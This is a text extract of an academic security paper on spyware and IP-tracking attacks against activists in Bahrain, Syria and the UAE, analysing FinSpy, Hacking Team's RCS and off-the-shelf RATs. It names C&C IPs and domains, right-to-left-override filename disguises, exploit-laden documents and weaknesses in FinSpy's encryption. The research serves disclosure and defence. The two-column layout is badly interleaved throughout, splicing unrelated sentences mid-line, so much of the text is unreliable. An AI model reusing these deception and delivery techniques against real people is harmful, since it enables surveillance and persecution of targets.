formation obtained in the attack, aligns with the interests of a          at government use of devices to enable censorship, such as key-
government.In some cases, such as Ali’s, the attackers appear            word blacklists for Chinese chat clients [13], or the Green Dam
to be governments themselves; in other cases, they appear in-             censorware that was to be deployed on all new computers sold
stead to be pro-government actors, ranging from patriotic, not            in China [14].We are aware of only limited previous work
necessarily skilled volunteers to cyber mercenaries.The phe-             looking at advanced threat actors targeting activists with hack-
nomenon has been identified before, such as in Libya, when                ing, though this work has not always been able to establish ev-
the fall of Gaddafi’s regime revealed direct government ties to           idence of government connections [15].hacking during the 2011 Civil War [2].Platforms used by potential targets, such as GMail [16],
   We make the following contributions:                                   Twitter [17], and Facebook [18] increasingly make transport-
   • We analyze the technology associated with targeted at-               layer encryption the default, obscuring communications from
     tacks (e.g., malicious links, spyware), and trace it back            most network surveillance.This use of encryption, along with
     to its programmers and manufacturers.While the attacks              the global nature of many social movements, and the role of
     are not novel—and indeed often involve technology used               diaspora groups, likely makes hacking increasingly attractive,
     by the cybercrime underground—they are significant be-               especially to states who are unable to request or compel content
     cause they have a real-world impact and visibility, and              from these platforms.Indeed, the increasing use of encryption
     are connected to governments.In addition, we often find             and the global nature of targets have both been cited by pur-
     amateurish mistakes in either the attacker’s technology or           veyors of “lawful intercept” trojans in their marketing materi-
     operations, indicating that energy spent countering these            als [1, 19].In one notable case in 2009, UAE telecom firm Eti-
     threats can realize significant benefits.We do not, how-            salat distributed a system update to its then 145,000 BlackBerry
     ever, conclude that all nation-state attacks or attackers            subscribers that contained spyware to read encrypted Black-
     are incompetent, and we suspect that some attacks have               Berry e-mail from the device.The spyware was discovered
     evaded our detection.when the update drastically slowed users’ phones [20].In con-
                                                                          trast to country-scale distribution, our work looks at this kind of
   • When possible, we empirically characterize the attacks
                                                                          pro-government and government-linked surveillance through
     and technology we have observed.We map out global
                                                                          highly targeted attacks.use of two commercial hacking tools by governments by
     searching through Internet scan data using fingerprints for             The term APT (Advanced Persistent Threat) refers to a
     command-and-control (C&C) servers derived from our                   sophisticated cyber-attacker who persistently attempts to tar-
     spyware analysis.get an individual or group [21].Work outside the academic
                                                                          community tracking government cyberattacks typically falls
   • We develop strong evidence tying attacks to govern-                  under this umbrella.There has been significant work on
     ment sponsors and corporate suppliers, countering de-                APT outside the academic community, especially among se-
     nials, sometimes energetic and sometimes indirect, of                curity professionals, threat intelligence companies, and human
     such involvement [3, 4, 5, 6], in contrast to denials [7]            rights groups.Much of this work has focused on suspected
     or claims of a corporate “oversight” board [8].Our scan-            government-on-government or government-on-corporation cy-
     ning suggests use of “lawful intercept” trojans by 11 ad-            ber attacks [22, 23].Meanwhile, a small but growing body
     ditional countries considered governed by “authoritarian             of this research deals with attacks carried out by governments
     regimes.” We believe that activists and journalists in such          against opposition and activist groups operating within, as well
     countries may experience harassment or consequences to               as outside their borders.One of the most notable cases is
     life or liberty from government surveillance.GhostNet, a large-scale cyber espionage campaign against the
   Finally, we do not explore potential defenses appropriate for          Tibetan independence movement [24, 25].Other work avoids
protecting the target population in this work.We believe that to         drawing conclusions about the attackers [26].contacts
    UAE       7/23/12—            7 activists, human rights campaigners, and     31 distinct malware samples spanning 7 types; 5 dis-    12 distinct IP addresses
              7/31/13             journalists                                    tinct exploits


                                                         Table 1: Range of data for the study.Country   Possible Impacts                  Probable Impacts
    Bahrain   1.3 individuals arrested, sen-   1.Activist serving 1 yr in
              tenced to 1–12 mo in prison       prison
              2.Union leader questioned by     2.Police raid on house
              police; fired
    Syria     1.Sensitive opposition com-      1.Opposition members dis-
              munications exposed to gov-       credited by publishing embar-
              ernment                           rassing materials
              2.Exfiltrated material used to   2.Exfiltrated materials used
              identify and detain activists     during interrogation by secu-
                                                rity services
    UAE       Contacts targeted via mal-        Password stolen,        e-mail
              ware                              downloaded



Table 2: Negative outcomes plausibly or quite likely aris-
ing from attacks analyzed.Figure 1: E-mail containing FinSpy.4.1      Bahrain
3      Data Overview and Implications
                                                                                     We have analyzed two attack campaigns in the context of
Our study is based on extensive analysis of malicious files and                      Bahrain, where the government has been pursuing a crackdown
suspect communications relevant to the activities of targeted                        against an Arab-Spring inspired uprising since 2/14/2011.groups in Bahrain, Syria, and the UAE, as documented in Ta-                             The first involved malicious e-mails containing FinSpy, a
ble 1.A number of the attacks had significant real-world impli-                     “lawful intercept” trojan sold exclusively to governments.The
cations, per Table 2.In many cases, we keep our descriptions                        second involved specially crafted IP spy links and e-mails de-
somewhat imprecise to avoid potential leakage of target identi-                      signed to reveal the IP addresses of operators of pseudonymous
ties.accounts.Some individuals who apparently clicked on these
   We began our work when contacted by individuals con-                              links were later arrested, including Ali (cf.§1), whose click
cerned that a government might have targeted them for cyber-                         appears to have been used against him in court.While both
attacks.We examine
with the groups.For Bahrain and Syria, the work encompassed                         each campaign in turn.10,000s of e-mails and instant messages.For the UAE, the vol-
ume is several thousand communications.FinSpy Campaign.Beginning in April 2012, the authors
                                                                                     received 5 suspicious e-mails from US and UK-based activists
4      Case Studies: Three Countries                                                 and journalists working on Bahrain.We found that some
                                                                                     of the attachments contained a PE (.exe) file designed to
This following sections outline recent targeted hacking cam-                         appear as an image.Their filenames contained a Uni-
paigns in Bahrain, Syria and the UAE.These cases have a com-                        code right-to-left override (RLO) character, causing Windows
mon theme: attacks against targets’ computers and devices with                       to render a filename such as gpj.1bajaR.exe instead as
malicious files and links.In some cases the attackers employed                      exe.Rajab1.jpg.expensive and “government exclusive” malware, while in other                            The other .rar files contained a Word document with an
cases, attackers used cheap and readily available RATs.Across                       embedded ASCII-encoded PE file containing a custom macro
these cases we find that clever social engineering often plays                       set to automatically run upon document startup.Under default
a central role, which is strong evidence of a well-informed ad-                      security settings, Office disables all unsigned macros, so that
versary.We also, however, frequently find technical and op-                         a user who opens the document will only see an informational
erational errors by the attackers that enable us to link attacks                     message that the macro has been disabled.Thus, this attack was
to governments.In general, the attacks we find are not well-                        apparently designed with the belief or hope that targets would
detected by anti-virus programs.have reduced security settings.3
USENIX Association 	                                                                                            23rd USENIX Security Symposium  513
   Identification as FinSpy: By running the sample using                  ated with another government [4].However, a proxy would
Windows Virtual PC, we found the following string in mem-                 show gaps in a global IPID as it forwarded traffic; our frequent
ory: y:\lsvn_branches\finspyv4.01\finspyv2\.observation of strictly consecutive IPIDs thus contradicts this
This string suggests FinSpy, a product of Gamma Inter-                    statement.national [27].The executables used virtualized obfusca-                     Exploitation of captured data: Since we suspected the spy-
tion [28], which appeared to be custom-designed.We de-                   ware operator would likely seek to exploit captured credentials,
vised a fingerprint for the obfuscater and located a structurally         particularly those associated with Bahraini activist organiza-
similar executable by searching a large malware database.tions, we worked with Bahrain Watch, an activist organization
This executable contained a similar string, except it identi-             inside Bahrain.Bahrain Watch established a fake login page
fied itself as FinSpy v3.00, and attempted to connect to                  on their website and provided us with a username and pass-
tiger.gamma-international.de, a domain registered                         word.From a clean VM, we logged in using these credentials,
to Gamma International GmbH.saving the password in Mozilla Firefox.We then infected the
   Analysis of capabilities: We found that the spyware has                VM with FinSpy and allowed it to connect to the Bahrain C&C
a modular design, and can download additional modules from                server.Bahrain Watch’s website logs revealed a subsequent
a command & control (C&C) server, including password cap-                 hit from 89.148.0.41—made however to the site’s home-
ture (from over 20 applications) and recording of screenshots,            page, rather than its login page—coming shortly after we had
Skype chat, file transfers, and input from the computer’s micro-          infected the VM.Decrypting packet captures of the spyware’s
phone and webcam.activity, we found that our VM sent the password to the server
   To exfiltrate data back to the C&C server, a module encrypts           exactly one minute earlier:
and writes it to disk in a special folder.The spyware period-
ically probes this folder for files that match a certain naming           INDEX,URL,USERNAME,PASSWORD,USERNAME FIELD,
convention, then sends them to the C&C server.It then over-              PASSWORD FIELD,FILE,HTTP 1,
writes the files, renames them several times, and deletes them,           http://bahrainwatch.org,bhwatch1,watchba7rain,
                                                                          username,password,signons.sqlite,,
in an apparent effort to frustrate forensic analysis.Very Strong,3.5/4.x
   Analysis of encryption: Because the malware employed
myriad known anti-debugging and anti-analysis techniques, it                 The URL provided to the server did not include the path
thwarted our attempts to attach debuggers.Since it did not in-           to the login page, which was inaccessible from the home-
clude anti-VM code, we ran it in TEMU, an x86 emulator de-                page.This omission reflects the fact that the Firefox password
signed for malware analysis [29].TEMU captures instruction-              database stores only domain names, not full login page URLs,
level execution traces and provides support for taint-tracking.for each password.Repeating the experiment again yielded a
   We found that FinSpy encrypts data using a custom imple-               hit from the same IP address within a minute.We inspected
mentation of AES-256-CBC.The 32 byte AES key and 16 byte                 Bahrain Watch’s logs, which showed no subsequent (or previ-
IV are generated by repeatedly reading the low-order-4-bytes of           ous) activity from that address, nor any instances of the same
the Windows clock.The key and IV are encrypted using an em-              User Agent string.bedded RSA-2048 public key, and stored in the same file as the
data.The private key presumably resides on the C&C server.The weak AES keys make decryption of the data straightfor-                IP spy Campaign.In an IP spy attack, the attacker aims to
ward.We wrote a program that generally can find these keys in            discover the IP address of a victim who is typically the opera-
under an hour, exploiting the fact that many of the system clock          tor of a pseudonymous social media or e-mail account.The at-
readings occur within the same clock-update quantum.tacker sends the pseudonymous account a link to a webpage or
   In addition, FinSpy’s AES code fails to encrypt the last block         an e-mail containing an embedded remote image, using one of
of data if less than the AES block size of 128 bits, leaving trail-       many freely-available services.2 When the victim clicks on the
ing plaintext.Finally, FinSpy’s wire protocol for C&C commu-             link or opens the e-mail, their IP address is revealed to the at-
nication uses the same type of encryption, and thus is subject            tacker.3 The attacker then discovers the victim’s identity from
to the same brute force attack on AES keys.While we suspect              their ISP.In one case we identified legal documents that pro-
FinSpy’s cryptographic deficiencies reflect bugs, it is also con-         vided a circumstantial link between such a spy link and a sub-
ceivable that the cryptography was deliberately weakened to               sequent arrest.facilitate one government monitoring the surveillance of oth-                Figure 2 illustrates the larger ecosystem of these attacks.The
ers.attackers appear to represent a single entity, as the activity all
   C&C server:            The samples communicated with                   connects back to accounts that sent links shortened using a par-
77.69.140.194, which belongs to a subscriber of                           ticular user account al9mood4 on the bit.ly URL shortening
Batelco, Bahrain’s main ISP.Analyzing network traffic                    service.between our infected VM and the C&C server revealed that                     Recall Ali Faisal Al-Shufa (discussed in Section 1), who
the server used a global IPID, which allowed us to infer server           was accused of sending insulting tweets from an account
activity by its progression.2 e.g.,
                                                                                   iplogger.org, ip-spy.com, ReadNotify.com.In response to our preliminary work an executive at Gamma                 3 Several webmail providers and e-mail clients take limited steps to
told the press that Bahrain’s FinSpy server was merely a proxy            automatically block loading this content, but e-mails spoofed to come
and the real server could have been anywhere, as part of a claim          from a trusted sender sometimes bypass these defenses.@alkawarahnews (Al Kawarah News in Figure 2).An op-                                            revolved around Tweets that referred to Bahrain’s King as a
erator of the account forwarded us a suspicious private message                                 “cursed one.” Red Sky had earlier targeted other users with IP
sent to the Al Kawarah News Facebook account from Red Sky.spy links shortened using the al9mood bit.ly account.However, the account also directly crit-
found that the passwords for his Twitter, Facebook, and e-mail
                                                                                                icized the King on occasion, in one case referring to him as
accounts had been changed, and did not know how to recover
                                                                                                “weak” and “stingy.” An account linked to al9mood sent Je-
his accounts.had Abdulla an IP spy link on 10/2/12 in a public message.On
   The message that Red Sky’s account sent to Al Kawarah
                                                                                                10/16/12, Salman Darwish was arrested for insulting the King
News included a link shortened using Google’s goo.gl ser-
                                                                                                using the Jehad Abdulla account.He was sentenced to one
vice.We used the goo.gl API to access analytics for the link,
                                                                                                month in prison, partly on the basis of his confession.Salman’s
finding that it unshortened to iplogger.org/25SX and was
                                                                                                father claims that police denied Salman food, drink, and medi-
created on 12/8/12.The link had received only one click, which
                                                                                                cal care.came from Bahrain with the referrer www.facebook.com.Ali’s case files contained a request from the Public Prose-                                     Another account linked to al9mood targeted @YLUBH, the
cution for information on an IP address that it had linked to Al                                Twitter account of Yokogawa Union, a trade union at the
Kawarah News about 22 hours after the link was created.Court                                   Bahraini branch of a Japanese company.@YLUBH received at
documents indicate that ISP data linked the IP address to Ali,                                  least three IP spy links in late 2012, sent via public Twitter mes-
and on this basis he was sentenced to one year in prison.sages.Yokogawa fired the leader of the trade union, Sami Ab-
   Red Sky also targeted M in Figure 2.M recalled click-                                       dulaziz Hassan, on 3/23/13 [30].It later emerged that Sami was
ing on a link from Red Sky while using an Internet connec-                                      indeed the operator of the @YLUBH account, and that the police
tion from one of the houses in M’s village.The house was                                       had called him in for questioning in relation to its tweets [31].raided by police on 3/12/13, who were looking for the sub-
                                                                                                   Use of embedded remote images: We identified several
scriber of the house’s internet connection.Police questioning
                                                                                                targets who received spoofed e-mails containing embedded
   5 According to information we received from two Twitter users, one                           remote images.Figure 2 shows two such cases, Maryam
of whom claimed to have met Red Sky in prison; another to be a col-                             and Sayed Yousif.The attacker sent the e-mails using
league.These techniques often limit
header not added when sending through ReadNotify.com’s                      the world-visibility of malicious files and links, slowing their
other supported methods.The header appeared in each e-mail                 detection by common AV products.Typically, targets receive
the targets forwarded to us.either (1) a PE in a .zip or .rar, (2) a file download link, or
   When spoofing using this method, the original sender ad-                 (3) a link that will trigger a drive-by download.The messages
dress still appears in X-Sender and other headers.Accord-                  usually include text, often in Arabic, that attempts to persuade
ing to these, the e-mails received by the targets all came from             the target to execute the file or click the link.fatoomah85@gmail.com.A link sent in one of these e-                            The first attacks in Figure 3 date to 2012, and use bait files
mails was connected to the al9mood bit.ly account.with a DarkComet RAT payload.These attacks share the same
   In monitoring accounts connected to al9mood, we counted                  C&C, 216.6.0.28, a Syrian IP address belonging to the Syr-
more than 200 IP spy links in Twitter messages and public                   ian Telecommunications Establishment, and publicly reported
Facebook posts.Attackers often used (1) accounts of promi-                 as a C&C of Syrian malware since February 2012 [45].The
nent or trusted but jailed individuals like “Red Sky,” (2) fake             first bait file presents to the victim as a PDF containing infor-
personas (e.g., attractive women or fake job seekers when tar-              mation about a planned uprising in Aleppo.In fact the file is a
geting a labor union), or (3) impersonations of legitimate ac-              Windows Screensaver (.scr) that masquerades as a PDF using
counts.In one particularly clever tactic, attackers exploited              Unicode RLO, rendering a name such as “.fdp.scr” dis-
Twitter’s default font, for example substituting a lowercase “l”            play to the victim as “.rcs.pdf.” The second bait file is
with an uppercase “I” or switching vowels (e.g.from “a” to                 a dummy program containing DarkComet while masquerading
an “e”) to create at-a-glance identical usernames.In addition,             as a Skype call encryption program, playing to opposition para-
malicious accounts tended to quickly delete IP spy tweets sent              noia about government backdoors in common software.The
via (public) mentions, and frequently change profile names.third attack in Figure 3, observed in October 2013, entices tar-
                                                                            gets with e-mails purporting to contain or link to videos about
                                                                            the current conflict, infecting victims with Xtreme RAT, and
4.2     Syria                                                               using the C&C tn1.linkpc.net.The use of RATs against the opposition has been a well-                         For seeding, the attackers typically use compromised ac-
documented feature of the Syrian Civil War since the first re-              counts (including those of arrested individuals) or fake iden-
ports were published in early 2012 [36, 39, 40, 32, 34].The                tities masquerading as pro-opposition.Our illustration shows
phenomenon is widespread, and in our experience, most mem-                  in abstract terms the use of Victim A’s account to seed mal-
bers of the opposition know that some hacking is taking place.ware (“Aleppo Plan”) via (say) Skype messages to Victim(s)
As summarized in Table 3, the attacks often include fake or ma-             Bn .In the cases of Opp.Member C and NGO Worker
liciously packaged security tools; intriguing, or ideological, or           D (here, actual victims, not abstract), targeting was by e-mail
movement-relevant content (e.g.lists of wanted persons).The               from domains apparently belonging to opposition groups, in-
seeding techniques and bait files suggest a good understanding              dicating a potential compromise.One domain remains active,
of the opposition’s needs, fears and behavior, coupled with ba-             hosting a website of the Salafist Al-Nusra front [46], while the
sic familiarity with off-the-shelf RATs.In some cases attacks              other appears dormant.Opp.Member C received a malicious
occur in a context that points to a more direct connection to               file as an e-mail attachment, while NGO Worker D was sent a
one of the belligerents: the Syrian opposition has regularly ob-            shortened link (url[.]no/Uu5) to a download from a directory
served that detainees’ accounts begin seeding malware shortly               of Mrconstrucciones[.]net,7 a site that may have been com-
after their arrest by government forces [41].promised.Both attacks resulted in an Xtreme RAT infection.Researchers and security professionals have already profiled                 Interestingly, in the case of the fake Skype encryption
many of these RATs, including DarkComet [42, 43], Black-                    the deception extended to a YouTube video from “IT Se-
shades Remote Controller [38], Xtreme RAT [44], njRAT [26],                 curity Lab” [47] demonstrating the program’s purported ca-
and ShadowTech [36].Some are available for purchase by any-                pabilities, as well as a website promoting the tool, skype-
one, in contrast to “government only” FinSpy and RCS.For ex-               encryption.sytes.net.The attackers also constructed a ba-
ample, Xtreme RAT retails for e350, while a version of Black-               sic, faux GUI for their “Encryption” program (see Figure 4).shades lists for e40.Others, like DarkComet, are free.We                  The fake GUI has a number of non-functional buttons like “En-
have also observed cracked versions of these RATs on Arabic-                crypt” and “DeCrypt,” which generate fake prompts.While dis-
language hacker forums, making them available with little ef-               tracted by this meaningless interaction, the victim’s machine is
fort and no payment trail.While the RATs are cheaper and less              infected with DarkComet 3.3 [32, 33].Anecdotally, campaign volume appears to track significant
  6 YahooMail and the iPhone mail client automatically load these re-

mote images, especially in e-mails spoofed from trusted senders.7 Obfuscated   to avoid accidental clicks on active malware URLs.BS = Blackshades, DC = DarkComet, ST = Shad-
owTech.Member C         NGO Worker D
                                                   file        Account seeds
                                                               “Aleppo Plan”


                                  Figure 3: A sample from the ecosystem of Syrian malware campaigns.events in the ongoing conflict.For example, campaigns dwin-
dled and then rebounded within hours after Syria’s 2012 Inter-
net shutdown [48].Similarly, activity observed by the authors
also dwindled prior to expectation of US-led military action
against Syrian government targets in September 2013.Once
this option appeared to be off the table, the volume of new
samples and campaigns we observed again increased, includ-
ing the recent targeting of NGO workers per Figure 3.We are
aware of only a negligible number of cases of the opposition
using similar RATs against Syrian Government supporters, al-
though evidence exists of other kinds of electronic attacks by
third parties.Real world consequences.The logistics and activities of
Syria’s numerous opposition groups are intentionally concealed
from public view to protect both their efficacy, and the lives of
people participating in them.Nevertheless, Syrian opposition
members are generally familiar with stories off digital compro-                         Figure 4: The fake Skype program distracts the victim
mises of high-profile figures, including those entrusted with the                       with the promise of encrypted communications while in-
most sensitive roles, as well as rank-and-file members.Com-                            fecting their machine with DarkComet.promise of operational security poses a documented threat to
life both for victims of electronic compromise, and to family
members and associates.Moreover, many individuals                                                                                 owner.no-ip.biz
whose identities have been compromised are in prison or oth-
erwise disappeared, and thus unable to relate the evidence pre-                            CVE-2010-3333
sented to them during interrogation.Still, strong circumstantial
evidence links the use of RATs, phishing, and government ac-
                                                                                                                 “wikileaks”         Xtreme RAT
tivity, which we briefly summarize here: (1) many Syrians have                             RCS                 “veryimportant”
recounted to journalists and the authors how interrogators con-
fronted them with material from their computers.For example:
      The policeman told me, “Do you remember when
      you were talking to your friend and you told him
      you had something wrong [sic] and paid a lot of                                                    Author
      money?(3) Finally, despite the notoriety of the attack                                              compromised

campaigns, including mention of C&C IPs in international me-
dia [45], the Syrian government has made no public statements
about these campaigns nor acted to shut down the servers.Figure 5: Part of the ecosystem of UAE surveillance at-
    Beyond the ongoing challenges of attribution, these malware          tacks.campaigns have a tangible impact on the Syrian opposition, and
generally align with the interests of the Syrian government’s            from ar-24.com, which in turn downloaded spyware from
propaganda operations.The case of Abdul Razzaq Tlass, a                 ar-24.com.We denote this combination as the 3-Stage Ex-
leader in the Free Syrian Army, is illustrative of the potential         ploit Kit in Figure 5.
uses of such campaigns.In 2012 a string of videos emerged                  The C&C server also ran on ar-24.com.When we ob-
showing Tlass sexting and engaged in lewd activity in front of           tained the sample in July 2012, ar-24.com resolved to an
a webcam [49].While he denied the videos, the harm to his rep-          IP address on Linode, a hosting provider.Three months later, it
utation was substantial and he was eventually replaced [50].resolved to a UAE address belonging to the Royal Group [52],
                                                                         an organization linked to the UAE government; it is chaired by
                                                                         Sheikh Tahnoon bin Zayed Al-Nayhan, a member of the UAE
4.3    UAE
                                                                         ruling family and a son of the founder of the UAE.While the UAE has experienced no recent uprising or politi-                 Identification as RCS: We identified strings in memory
cal unrest, it has nevertheless cracked down on its opposition,          that matched those in a Symantec analysis [53] of RCS (also
concurrent with the Arab Spring.known as DaVinci or Crisis), a product of the Italian com-
   The first attacks we observed in the UAE involved a                   pany Hacking Team [54].We also located a structurally sim-
government-grade “lawful interception” trojan known as Re-               ilar Word document via VirusTotal.The document used the
mote Control System (RCS), sold by the Italian company Hack-             same exploit and attempted to download a second stage from
ing Team.The associated C&C server indicated direct UAE                 rcs-demo.hackingteam.it, which was unavailable at
government involvement.Over time, we stopped receiving                  the time of testing.RCS samples from UAE targets, and instead observed a shift                  Analysis of capabilities: RCS has a suite of functionality
to the use of off-the-shelf RATs, and possible involvement of            largely similar to FinSpy.One difference was in the vectors
cyber-mercenary groups.However, poor attacker operational               used to install the spyware.We located additional samples (see
security allowed us to link most observed attacks together.§ 5), some of which were embedded in a .jar file that installs
                                                                         an OS-appropriate version of RCS (Windows or OSX), option-
RCS.UAE activist Ahmed Mansoor (per Figure 5), impris-                  ally using an exploit.If embedded as an applet, and no exploit
oned from April to November 2011 after signing an online pro-            is present, Java displays a security warning and asks the user
democracy petition [51], received an e-mail purportedly from             whether they authorize the installation.We also saw instances
“Arabic Wikileaks” in July 2012.He opened the associated at-            of the 3-Stage Exploit Kit where the first stage contained a
tachment, “veryimportant.doc,” and saw what he described as              Flash exploit; in some cases, we could obtain all stages and
“scrambled letters”.He forwarded us the e-mail for investiga-           confirm that these installed RCS.Some samples were packed
tion.with the MPress packer [55], and some Windows samples were
   The attachment exploited CVE-2010-3333, an RTF pars-                  obfuscated to look like the PuTTY SSH client.ing vulnerability in Microsoft Office.The document did not                 Another difference is in persistence.For example, the RCS
contain any bait content, and part of the malformed RTF                  sample sent to Ahmed adds a Run registry key, whereas the
that triggered the exploit was displayed in the document.FinSpy samples used in Bahrain overwrite the hard disk’s boot
The exploit loaded shellcode that downloaded a second stage              sector to modify the boot process; the spyware is loaded be-


                                                                     8
518  23rd USENIX Security Symposium	                                                                                                 USENIX Association
fore the OS, and injects itself into OS processes as they start.We did not observe similar                                                           Used by sample
                                                                                                                    that talks to C&C
capabilities in the FinSpy samples we examined.Journalist A,
                                                                              H.R.activist B    njq8
                                                                                                                                          Journalist F
   Exploitation of captured data: When Ahmed Mansoor re-
ceived the RCS document, he opened it, infecting his computer                  njRAT                           VB Packer                   upload.bz
(Figure 5).Ahmed subsequently noted several suspicious ac-                               storge.myftp.org
cesses to his GMail account using IMAP.Even after he changed
his password, the accesses continued.While corresponding
with Ahmed on his compromised account, an author of this pa-
per discovered that the attackers had installed an application-
specific password [56] in Ahmed’s GMail account, a secondary                            Relative of                                  SpyNet
                                                                                   political detainee D
password that they apparently used to access his account even
after he changed his main password.The suspicious accesses                        Journalist C

stopped after removal of the application-specific password.Two weeks after this correspondence with Ahmed, one of us
(Author in Figure 5) received a targeted e-mail with a link to                                    H.R.activist E
a file hosted on Google Docs containing a commercial off-the-                   SameIP1

shelf RAT, Xtreme RAT.The e-mail was sent from the UAE’s
timezone (as well as of other countries) and contained the terms                 sn.all-google.com           DarkComet      Appin       CVE 2012-0158
“veryimportant” and “wikileaks”, just like in the e-mail re-
ceived by Ahmed.The instance of Xtreme RAT sent to Author used                       Figure 6: Another part of the ecosystem of UAE surveil-
owner.no-ip.biz for its C&C, one of the domains men-                    lance attacks.tioned in a report published by Norman about a year-long cam-
paign of cyberattacks on Israeli and Palestinian targets carried
out by a group that Norman was unable to identify [57].Three           Off-the-shelf RATs.We found a file that VirusTotal had
months after Author was targeted, Ahmed received an e-mail              downloaded from faddeha.com, which appeared to be a re-
containing an attachment with Xtreme RAT that talked to the             mote access toolkit known as SpyNet, available for general pur-
same C&C server (Figure 5), suggesting that the attackers who           chase for 50 Euros [60].The SpyNet sample communicated
infected Ahmed with RCS may have provided a list of interest-           with the C&C hamas.sytes.net.ing e-mail addresses to another group for further targeting.SpyNet Packing: We found another instance of the first
                                                                        stage of the 3-Stage Exploit Kit on VirusTotal.The exploit
   Possible consequences: Shortly after he was targeted,                downloaded a second stage, which in turn downloaded a sam-
Ahmed says he was physically assaulted twice by an attacker             ple of SpyNet from maile-s.com.This sample of SpyNet
who appeared able to track Ahmed’s location [58].He also re-           communicated with the same C&C hamas.sytes.net.ports that his car was stolen, a large sum of money disappeared         The sample was packed using ASProtect [61].When run, the
from his bank account, and his passport was confiscated [59].sample unpacks a compiled Visual Basic project that loads, via
He believes these consequences are part of a government in-             the RunPE method [62], an executable packed with UPX [63].timidation campaign against him, but we did not uncover any             Finally, this executable unpacks SpyNet.SpyNet’s GUI only
direct links to his infection.(Interestingly, spyware subse-           offers an option to pack with UPX, suggesting that the attack-
quently sent to others has used bait content about Ahmed.)ers specially added the other layers of packing.The attachment contained an embedded Flash file             tion by the attacker.The SpyVisual projects contain the string
that exploited a vulnerability fixed in Adobe Flash 11.4, loading       c:\Users\Zain\AppData\Local\Temp\OLE1EmbedStrm.wav,
shell code to download a second stage from faddeha.com.which we used as the fingerprint VB Packer in Figure 6.We were unable to obtain the second stage or the ultimate pay-             Cedar Key attack: The same VB Packer was used in an
load, as the website was unavailable at the time of testing.attack on Relative of political detainee D and H.R.activist
However, the exploit kit appears indicative of Hacking Team             E in Figure 6.These individuals received e-mails containing a
involvement.A page on faddeha.com found in Google’s                    link to a web page hosted on cedarkeyrv.com impersonat-
cache contained an embedded .jar with the same applet class             ing YouTube.Loading the page greeted the target with “Video
(WebEnhancer) as those observed in other .jar files that we             loading please wait ...” The page redirected to a YouTube
found to contain RCS.video a few seconds later, but first loaded a Java exploit [64]—a


                                                                    9
USENIX Association 	                                                                                 23rd USENIX Security Symposium  519
known vulnerability with no patch at the time that the e-mails           servers to develop indicators (fingerprints) for how the servers
were sent.Oracle released a patch 12 hours after activists began        respond to certain types of requests.We then scanned the full
receiving these links.Internet IPv4 address space (“/0”) for these, along with prob-
   The cedarkeyrv.com domain is associated with an RV                    ing results found by past scans.In many cases we do not release
park in Cedar Key, Florida.The website’s hosting company                the full details of our fingerprints to avoid compromising what
told us that the site had apparently suffered a compromise, but          may be legitimate investigations.did not have further details.The exploit used in the attack appears to have been origi-
                                                                         5.1    FinSpy
nally posted by a Kuwaiti user, njq8, on an Arabic-language
exploit sharing site [65].We contacted njq8, who told us                Identifying and linking servers: We developed a number
that he had obtained the exploit elsewhere and modified it               of fingerprints for identifying FinSpy servers using HTTP-
prior to posting.The attack downloaded an instance of                   based probing as well as FinSpy’s custom TLV-based proto-
SpyNet from isteeler.com (which from our inspection did                  col. We leveraged quirks such as specific non-compliance
not appear to have any legitimate content), which used the               with RFC 2616, responses to certain types of invalid data,
C&C storge.myftp.org.This same C&C occurred in an-                      and the presence of signatures such as the bizarre “Hallo
other attack (Figure 6) targeting Relative of political detainee         Steffi” that Guarnieri identified from Bahraini FinSpy C&C
D; in that case, the payload was a freely-available RAT known            servers [67, 68].See Appendix A for details.We then exhaus-
as njRAT, written by the same njq8 as the exploit-poster dis-            tively scanned the Internet looking for matches to these finger-
cussed above.However, we did not find any other evidence                prints.suggesting njq8’s involvement in either attack.Gamma documentation advertises that an operator of FinSpy
   More SpyNet attacks: The domain hamas.sytes.net,                      can obscure the location of the C&C server (called the mas-
which we previously saw used by two SpyNet sam-                          ter) by setting up a proxy known as a relay.In Spring 2013
ples, resolved to 67.205.79.177.Historically,        we noticed FinSpy servers now issuing 302 Redirects to
dreems.no-ip.ca also resolved to this address.An                        google.com.However, we noticed anomalies: for ex-
unidentified dropper using this C&C targeted Journalist F; a             ample, servers in India were redirecting to the Latvian ver-
SpyNet attack on Relative of political detainee D also used              sion of Google google.lv.We suspect that the server
this C&C.In that latter case, the sample arrived via e-mail             in India was a relay forwarding to a master in Latvia.Be-
in a .rar attachment that contained an .scr file disguised               cause the master served as a proxy for Google, we could
as a Word document.The .scr file was a self-extracting                  uncover its IP address using a Google feature that prints a
archive that decompressed and ran both the bait document                 user’s IP address for the query “IP address.” We created an
and the payload.The SMTP source of the e-mail was                       additional fingerprint based on the proxying behavior and is-
webmail.upload.bz.sued GET /search?q=ip+address&nord=1 requests to
   Appin: In early 2013 UAE H.R.activist E forwarded nu-                servers We note some interesting master locations in Table 4.
merous documents that included a particular CVE-2012-0158                   Server locations: In all, our fingerprints matched 92 dis-
exploit for Microsoft Word.In all, these totaled 17 distinct            tinct IP addresses in 35 different countries.Probing these on
hashes of documents, and 10 distinct hashes of payloads (some            8/8/13 revealed 22 distinct addresses still responding, sited
documents that differed in their hash downloaded the same pay-           in: Bahrain, Bangladesh, Bosnia and Herzegovina, Estonia,
load).The exploits primarily downloaded instances of SpyNet             Ethiopia, Germany, Hong Kong, Indonesia, Macedonia, Mex-
from upload.bz, which for the most part communicated                     ico, Romania, Serbia, Turkmenistan, and the United States.We
with C&C at sn.all-google.com.This domain was also                      found servers responding to a number of our fingerprints, sug-
used for C&C in other attacks, including that on Journalist C.           gesting either that some servers lag in their updates, or a con-
   Two of the other CVE-2012-0158 exploits down-                         certed effort to vary the behavior of FinSpy servers to make
loaded DarkComet from www.getmedia.us and                                detection harder.www.technopenta.com after posting system infor-                             We found: (1) 3 IP addresses in ranges registered to Gamma.mation to random123.site11.com.All three domains                        (2) Servers in 3 IP ranges explicitly registered to govern-
match those used by an Indian cybermercenary group said                  ment agencies: Turkmenistan’s Ministry of Communications,
to be linked to Appin Security Group [66].The former          Qatar’s State Security Bureau, and the Bulgarian Council of
two domains hosted content other than spyware (i.e., they                Ministers.(3) 3 additional IP addresses in Bahrain, all in
may have been compromised).We alerted the owner of                      Batelco.(4) Servers in 7 countries with governments classified
www.getmedia.us, who removed the payloads.as “authoritarian regimes” by The Economist [69]: Bahrain,
                                                                         Ethiopia, Nigeria, Qatar, Turkmenistan, UAE, Vietnam.Additional FinSpy samples: In parallel to our scanning,
5    Empirical characterization                                          we obtained 9 samples of FinSpy by writing YARA [70] rules
                                                                         for the “malware hunting” feature of VirusTotal Intelligence.The samples we received afforded us an opportunity to em-                This feature sends us all newly-submitted samples that match
